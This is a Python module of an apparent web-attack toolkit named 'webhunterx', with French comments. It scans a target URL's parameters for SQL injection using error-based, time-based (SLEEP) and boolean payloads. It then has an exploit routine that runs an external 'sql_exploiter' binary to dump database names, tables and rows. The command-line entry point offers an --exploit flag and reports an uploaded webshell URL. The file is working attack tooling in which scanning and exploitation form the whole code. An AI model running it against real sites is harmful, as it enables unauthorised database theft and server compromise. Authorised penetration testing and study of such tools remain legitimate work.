#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import json
import time
import logging
import subprocess
import tempfile
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Tuple, Optional, Union

# Importation des modules internes
from webhunterx.utils.http_tools import HTTPClient
from webhunterx.utils.logger import setup_logger

# Configuration du logger
logger = setup_logger('sqli')

class SQLiScanner:
    """
    Scanner de vulnérabilités SQL Injection
    """
    
    def __init__(self, target: str, options: Dict[str, Any] = None):
        """
        Initialise le scanner SQLi
        
        Args:
            target: URL cible ou domaine
            options: Options supplémentaires (timeout, threads, cookies, headers, etc.)
        """
        self.target = target
        self.options = options or {}
        self.http = HTTPClient(
            timeout=self.options.get('timeout', 30),
            user_agent=self.options.get('user_agent'),
            cookies=self.options.get('cookies'),
            headers=self.options.get('headers'),
            proxy=self.options.get('proxy'),
            verify_ssl=self.options.get('verify_ssl', False)
        )
        
        # Liste des points d'injection potentiels (URLs avec paramètres GET/POST)
        self.injection_points = []
        
        # Liste des payloads de test
        self.payloads = self._load_payloads()
        
        # Liste des vulnérabilités détectées
        self.vulnerabilities = []
        
        # Statistiques
        self.stats = {
            'urls_scanned': 0,
            'params_tested': 0,
            'vulns_found': 0
        }

    def _load_payloads(self) -> Dict[str, List[str]]:
        """
        Charge les payloads depuis les fichiers
        
        Returns:
            Dictionnaire des payloads par type
        """
        payload_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'payloads')
        sqli_file = os.path.join(payload_dir, 'sqli.txt')
        
        payloads = {
            'error': [],
            'time': [],
            'boolean': []
        }
        
        # Vérifier l'existence du fichier
        if not os.path.exists(sqli_file):
            logger.warning(f"Fichier de payloads non trouvé: {sqli_file}")
            # Payloads par défaut
            payloads['error'] = ["'", "\"", "1'", "1\"", "1' OR '1'='1", "1 OR 1=1"]
            payloads['time'] = ["1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -", "1' AND SLEEP(3)-- -"]
            payloads['boolean'] = ["1' AND 1=1-- -", "1' AND 1=2-- -"]
            return payloads
            
        # Lire le fichier de payloads
        try:
            with open(sqli_file, 'r') as f:
                lines = f.readlines()
                
            current_section = 'error'  # Section par défaut
            
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # Détection des sections
                if line.startswith('[') and line.endswith(']'):
                    section = line[1:-1].lower()
                    if section in payloads:
                        current_section = section
                    continue
                
                # Ajout du payload à la section actuelle
                payloads[current_section].append(line)
                
        except Exception as e:
            logger.error(f"Erreur lors du chargement des payloads: {e}")
            
        return payloads

    def crawl(self) -> None:
        """
        Explore le site pour trouver des points d'injection
        """
        logger.info(f"Exploration du site {self.target} pour trouver des points d'injection...")
        
        # Cette fonction devrait être connectée au crawler principal
        # Pour l'instant, nous simulons quelques points d'injection
        parsed_url = urlparse(self.target)
        
        # Vérifier si l'URL contient déjà des paramètres
        if parsed_url.query:
            self.injection_points.append({
                'url': self.target,
                'method': 'GET',
                'params': parse_qs(parsed_url.query)
            })
        
        # TODO: Intégrer le crawler complet ici
        # Par exemple, analyser le HTML pour trouver des formulaires, etc.
        
        logger.info(f"Points d'injection trouvés: {len(self.injection_points)}")

    def _test_error_based(self, url: str, param: str, payload: str) -> Tuple[bool, Optional[str]]:
        """
        Teste une injection SQL basée sur les erreurs
        
        Args:
            url: URL à tester
            param: Paramètre à tester
            payload: Payload à injecter
            
        Returns:
            (vulnérable, dbms): Tuple indiquant si c'est vulnérable et le DBMS détecté
        """
        # Signatures d'erreurs par DBMS
        error_signatures = {
            'mysql': [
                'SQL syntax.*MySQL', 'Warning.*mysql_.*', 'MySQLSyntaxErrorException',
                'valid MySQL result', 'MariaDB server'
            ],
            'postgres': [
                'PostgreSQL.*ERROR', 'Warning.*\Wpg_.*', 'valid PostgreSQL result',
                'Npgsql\.', 'PG::SyntaxError:'
            ],
            'mssql': [
                'Driver.* SQL[\-\_\ ]*Server', 'OLE DB.* SQL Server',
                'SQLServer JDBC Driver', 'Warning.*mssql_.*',
                'Microsoft SQL Native Client'
            ],
            'oracle': [
                'ORA-[0-9][0-9][0-9][0-9]', 'Oracle error', 'Warning.*oci_.*'
            ],
            'sqlite': [
                'SQLite/JDBCDriver', 'SQLite.Exception',
                'System.Data.SQLite.SQLiteException', 'Warning.*sqlite_.*'
            ]
        }
        
        # Injecter le payload
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [payload]
        
        # Reconstruire l'URL
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, new_query, parsed_url.fragment
        ))
        
        # Envoyer la requête
        try:
            response = self.http.get(new_url)
            self.stats['params_tested'] += 1
            
            # Vérifier les signatures d'erreurs
            for dbms, signatures in error_signatures.items():
                for signature in signatures:
                    if re.search(signature, response.text, re.IGNORECASE):
                        return True, dbms
        except Exception as e:
            logger.debug(f"Erreur lors du test d'injection: {e}")
        
        return False, None

    def _test_time_based(self, url: str, param: str, payload: str) -> Tuple[bool, Optional[str]]:
        """
        Teste une injection SQL basée sur le temps
        
        Args:
            url: URL à tester
            param: Paramètre à tester
            payload: Payload à injecter
            
        Returns:
            (vulnérable, dbms): Tuple indiquant si c'est vulnérable et le DBMS détecté
        """
        # Injecter le payload
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [payload]
        
        # Reconstruire l'URL
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, new_query, parsed_url.fragment
        ))
        
        # Envoyer la requête et mesurer le temps
        try:
            start_time = time.time()
            response = self.http.get(new_url)
            elapsed_time = time.time() - start_time
            self.stats['params_tested'] += 1
            
            # Si le temps de réponse est supérieur à 2 secondes, considérer comme vulnérable
            if elapsed_time > 2:
                # Détecter le DBMS à partir du payload
                dbms = "unknown"
                if "SLEEP" in payload.upper():
                    dbms = "mysql"
                elif "PG_SLEEP" in payload.upper():
                    dbms = "postgres"
                elif "WAITFOR DELAY" in payload.upper():
                    dbms = "mssql"
                elif "DBMS_LOCK.SLEEP" in payload.upper():
                    dbms = "oracle"
                elif "RANDOMBLOB" in payload.upper():
                    dbms = "sqlite"
                
                return True, dbms
        except Exception as e:
            logger.debug(f"Erreur lors du test d'injection: {e}")
        
        return False, None

    def _test_boolean_based(self, url: str, param: str, true_payload: str, false_payload: str) -> Tuple[bool, Optional[str]]:
        """
        Teste une injection SQL basée sur les conditions booléennes
        
        Args:
            url: URL à tester
            param: Paramètre à tester
            true_payload: Payload qui devrait retourner true
            false_payload: Payload qui devrait retourner false
            
        Returns:
            (vulnérable, dbms): Tuple indiquant si c'est vulnérable et le DBMS détecté
        """
        # Test avec TRUE condition
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [true_payload]
        
        new_query = urlencode(params, doseq=True)
        true_url = urlunparse((
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, new_query, parsed_url.fragment
        ))
        
        # Test avec FALSE condition
        params[param] = [false_payload]
        new_query = urlencode(params, doseq=True)
        false_url = urlunparse((
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, new_query, parsed_url.fragment
        ))
        
        try:
            true_response = self.http.get(true_url)
            false_response = self.http.get(false_url)
            self.stats['params_tested'] += 2
            
            # Comparer les réponses
            # Si elles sont différentes, c'est probablement vulnérable
            if (true_response.status_code == 200 and 
                len(true_response.text) != len(false_response.text) and
                abs(len(true_response.text) - len(false_response.text)) > 10):
                
                # Essayer de détecter le DBMS à partir du payload
                dbms = "unknown"
                if "LIKE" in true_payload:
                    dbms = "mysql"  # ou postgres, oracle, etc.
                
                return True, dbms
        except Exception as e:
            logger.debug(f"Erreur lors du test d'injection: {e}")
        
        return False, None

    def scan(self) -> List[Dict[str, Any]]:
        """
        Lance le scan des points d'injection détectés
        
        Returns:
            Liste des vulnérabilités détectées
        """
        # S'assurer que nous avons des points d'injection
        if not self.injection_points:
            self.crawl()
        
        logger.info(f"Début du scan des {len(self.injection_points)} points d'injection...")
        
        for point in self.injection_points:
            url = point['url']
            method = point['method']
            params = point['params']
            
            logger.info(f"Test de {url} ({method}) avec {len(params)} paramètres")
            self.stats['urls_scanned'] += 1
            
            for param in params:
                logger.debug(f"Test du paramètre {param}")
                
                # Test des injections basées sur les erreurs
                for payload in self.payloads['error']:
                    is_vuln, dbms = self._test_error_based(url, param, payload)
                    if is_vuln:
                        logger.warning(f"Vulnérabilité SQLi (error-based) détectée sur {url} - paramètre {param} - DBMS: {dbms}")
                        self.vulnerabilities.append({
                            'url': url,
                            'method': method,
                            'param': param,
                            'vulnerability_type': ['sqli', 'error-based'],
                            'payload': payload,
                            'dbms': dbms
                        })
                        self.stats['vulns_found'] += 1
                        break
                
                # Test des injections basées sur le temps
                for payload in self.payloads['time']:
                    is_vuln, dbms = self._test_time_based(url, param, payload)
                    if is_vuln:
                        logger.warning(f"Vulnérabilité SQLi (time-based) détectée sur {url} - paramètre {param} - DBMS: {dbms}")
                        self.vulnerabilities.append({
                            'url': url,
                            'method': method,
                            'param': param,
                            'vulnerability_type': ['sqli', 'time-based'],
                            'payload': payload,
                            'dbms': dbms
                        })
                        self.stats['vulns_found'] += 1
                        break
                
                # Test des injections basées sur les conditions booléennes
                if len(self.payloads['boolean']) >= 2:
                    for i in range(0, len(self.payloads['boolean']), 2):
                        if i + 1 < len(self.payloads['boolean']):
                            true_payload = self.payloads['boolean'][i]
                            false_payload = self.payloads['boolean'][i + 1]
                            
                            is_vuln, dbms = self._test_boolean_based(url, param, true_payload, false_payload)
                            if is_vuln:
                                logger.warning(f"Vulnérabilité SQLi (boolean-based) détectée sur {url} - paramètre {param} - DBMS: {dbms}")
                                self.vulnerabilities.append({
                                    'url': url,
                                    'method': method,
                                    'param': param,
                                    'vulnerability_type': ['sqli', 'boolean-based'],
                                    'payload': f"{true_payload} / {false_payload}",
                                    'dbms': dbms
                                })
                                self.stats['vulns_found'] += 1
                                break
        
        logger.info(f"Scan terminé. {self.stats['urls_scanned']} URLs scannées, {self.stats['params_tested']} paramètres testés, {self.stats['vulns_found']} vulnérabilités trouvées.")
        return self.vulnerabilities

    def exploit(self, vuln_index: int = 0) -> Dict[str, Any]:
        """
        Exploite une vulnérabilité SQLi détectée en utilisant sql_exploiter.go
        
        Args:
            vuln_index: Index de la vulnérabilité à exploiter dans la liste
            
        Returns:
            Résultats de l'exploitation
        """
        if not self.vulnerabilities:
            logger.error("Aucune vulnérabilité à exploiter. Lancez d'abord un scan.")
            return {"status": "error", "message": "Aucune vulnérabilité à exploiter"}
        
        if vuln_index >= len(self.vulnerabilities):
            logger.error(f"Index de vulnérabilité invalide. Il y a {len(self.vulnerabilities)} vulnérabilités.")
            return {"status": "error", "message": "Index de vulnérabilité invalide"}
        
        # Récupérer la vulnérabilité à exploiter
        vuln = self.vulnerabilities[vuln_index]
        logger.info(f"Exploitation de la vulnérabilité SQLi sur {vuln['url']} - paramètre {vuln['param']}...")
        
        # Préparation des paramètres pour l'exploitation
        exploit_type = "error"  # Par défaut
        if "time-based" in vuln['vulnerability_type']:
            exploit_type = "time"
        elif "boolean-based" in vuln['vulnerability_type']:
            exploit_type = "boolean"
        
        # Préparation de l'URL avec le marqueur FUZZ
        parsed_url = urlparse(vuln['url'])
        params = parse_qs(parsed_url.query)
        
        # Remplacer le paramètre vulnérable par FUZZ
        for key in params:
            if key == vuln['param']:
                params[key] = ["FUZZ"]
        
        new_query = urlencode(params, doseq=True)
        fuzz_url = urlunparse((
            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
            parsed_url.params, new_query, parsed_url.fragment
        ))
        
        # Chemin du binaire d'exploitation
        exploit_binary = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), 
            'modules_go', 
            'sql_exploiter'
        )
        
        # Sous Windows, ajouter l'extension .exe
        if os.name == 'nt':
            exploit_binary += '.exe'
        
        # Vérifier l'existence du binaire
        if not os.path.exists(exploit_binary):
            logger.error(f"Binaire d'exploitation non trouvé: {exploit_binary}")
            return {"status": "error", "message": "Binaire d'exploitation non trouvé"}
        
        # Créer un fichier temporaire pour les résultats
        with tempfile.NamedTemporaryFile(delete=False, suffix='.json') as tmp:
            output_file = tmp.name
        
        # Construire la commande
        cmd = [
            exploit_binary,
            "--url", fuzz_url,
            "--method", vuln['method'],
            "--dbms", vuln['dbms'],
            "--type", exploit_type,
            "--output", output_file,
            "--verbose"
        ]
        
        # Ajouter les cookies et headers si nécessaires
        if self.http.cookies:
            cookie_str = '; '.join([f"{k}={v}" for k, v in self.http.cookies.items()])
            cmd.extend(["--cookie", cookie_str])
        
        if self.http.headers:
            header_str = ';'.join([f"{k}:{v}" for k, v in self.http.headers.items()])
            cmd.extend(["--header", header_str])
        
        if self.http.proxy:
            cmd.extend(["--proxy", self.http.proxy])
        
        # Exécuter la commande
        try:
            logger.info(f"Exécution de la commande: {' '.join(cmd)}")
            process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(timeout=300)  # 5 minutes max
            
            if process.returncode != 0:
                logger.error(f"Erreur lors de l'exploitation: {stderr}")
                return {"status": "error", "message": f"Erreur d'exploitation: {stderr}"}
            
            # Lire les résultats
            try:
                with open(output_file, 'r') as f:
                    results = json.load(f)
                
                # Ajouter les informations de la vulnérabilité
                results['vulnerability'] = vuln
                
                logger.info(f"Exploitation réussie. Base de données: {results.get('db_name')}, Tables: {len(results.get('tables', []))}")
                return results
            except Exception as e:
                logger.error(f"Erreur lors de la lecture des résultats: {e}")
                return {"status": "error", "message": f"Erreur de lecture des résultats: {e}"}
        except Exception as e:
            logger.error(f"Erreur lors de l'exécution de l'exploitation: {e}")
            return {"status": "error", "message": str(e)}
        finally:
            # Nettoyer le fichier temporaire
            try:
                os.unlink(output_file)
            except:
                pass

def main():
    """
    Fonction principale pour les tests autonomes
    """
    import argparse
    
    parser = argparse.ArgumentParser(description='Scanner de vulnérabilités SQL Injection')
    parser.add_argument('target', help='URL ou domaine cible')
    parser.add_argument('-o', '--output', help='Fichier de sortie (JSON)')
    parser.add_argument('-c', '--cookies', help='Cookies (format: name1=value1; name2=value2)')
    parser.add_argument('-H', '--headers', help='Headers HTTP additionnels (format: name1:value1;name2:value2)')
    parser.add_argument('-P', '--proxy', help='Proxy (format: http://user:pass@host:port)')
    parser.add_argument('-e', '--exploit', action='store_true', help='Exploiter les vulnérabilités détectées')
    parser.add_argument('-v', '--verbose', action='store_true', help='Mode verbeux')
    
    args = parser.parse_args()
    
    # Configuration du niveau de verbosité
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Options
    options = {}
    
    if args.cookies:
        cookies = {}
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
        options['cookies'] = cookies
    
    if args.headers:
        headers = {}
        for header in args.headers.split(';'):
            if ':' in header:
                key, value = header.strip().split(':', 1)
                headers[key] = value
        options['headers'] = headers
    
    if args.proxy:
        options['proxy'] = args.proxy
    
    # Création du scanner
    scanner = SQLiScanner(args.target, options)
    
    # Lancement du scan
    vulnerabilities = scanner.scan()
    
    # Affichage des résultats
    if vulnerabilities:
        print(f"\n[+] {len(vulnerabilities)} vulnérabilités SQLi détectées:")
        for i, vuln in enumerate(vulnerabilities):
            print(f"  {i+1}. {vuln['url']} - paramètre: {vuln['param']} - type: {', '.join(vuln['vulnerability_type'])}")
        
        # Exploitation si demandée
        if args.exploit and vulnerabilities:
            print("\n[*] Exploitation de la première vulnérabilité...")
            results = scanner.exploit(0)
            
            if results['status'] == 'success':
                print(f"\n[+] Exploitation réussie!")
                print(f"  Base de données: {results.get('db_name')}")
                print(f"  Tables: {', '.join(results.get('tables', []))}")
                
                if results.get('data'):
                    print("\n[+] Données extraites:")
                    for table, rows in results['data'].items():
                        print(f"  Table {table}: {len(rows)} entrées")
                        for row in rows[:3]:  # Afficher max 3 entrées par table
                            print(f"    {row}")
                        if len(rows) > 3:
                            print(f"    ... et {len(rows) - 3} autres entrées")
                
                if results.get('shell_url'):
                    print(f"\n[+] Webshell uploadé: {results['shell_url']}")
            else:
                print(f"\n[-] Échec de l'exploitation: {results.get('message')}")
    else:
        print("\n[-] Aucune vulnérabilité SQLi détectée.")
    
    # Sauvegarde dans un fichier si demandé
    if args.output:
        output = {
            'target': args.target,
            'timestamp': time.time(),
            'vulnerabilities': vulnerabilities,
            'stats': scanner.stats
        }
        
        try:
            with open(args.output, 'w') as f:
                json.dump(output, f, indent=4)
            print(f"\n[+] Résultats sauvegardés dans {args.output}")
        except Exception as e:
            print(f"\n[-] Erreur lors de la sauvegarde des résultats: {e}")

if __name__ == '__main__':
    main() 